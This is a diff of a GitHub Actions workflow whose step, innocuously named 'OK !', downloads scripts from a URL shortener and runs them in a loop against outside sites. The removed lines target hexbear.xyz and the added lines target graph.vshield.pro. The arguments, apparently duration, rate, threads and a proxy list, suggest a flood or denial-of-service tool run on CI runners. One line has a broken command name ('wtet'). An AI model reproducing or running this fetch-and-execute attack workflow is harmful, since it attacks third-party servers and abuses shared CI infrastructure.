@@ -15,14 +15,13 @@ jobs:
     steps:
       - name: OK !
         run: |
-          pip install git+https://github.com/QuantumLLC/Archer
-          wget https://curl.by/I_c05/testraw.js
-          wget https://curl.by/vAY6g/Test.py
-          chmod +x testraw.js
-          chmod +x Test.py
+          wget https://curl.by/HxWoN/ua.txt
+          wget https://curl.by/YcH34/value.js
+          wtet https://curl.by/19kka/fres.txt
+          chmod +x value.js
           PIDS=()
           for i in {1..4}; do
-            timeout 105 python3 Test.py https://hexbear.xyz/xdxd && node testraw.js https://hexbear.xyz/xdxd 666
+            timeout 105 node value.js https://graph.vshield.pro/ 120 90 8 fres.txt
             PIDS+=($!)
           done
           
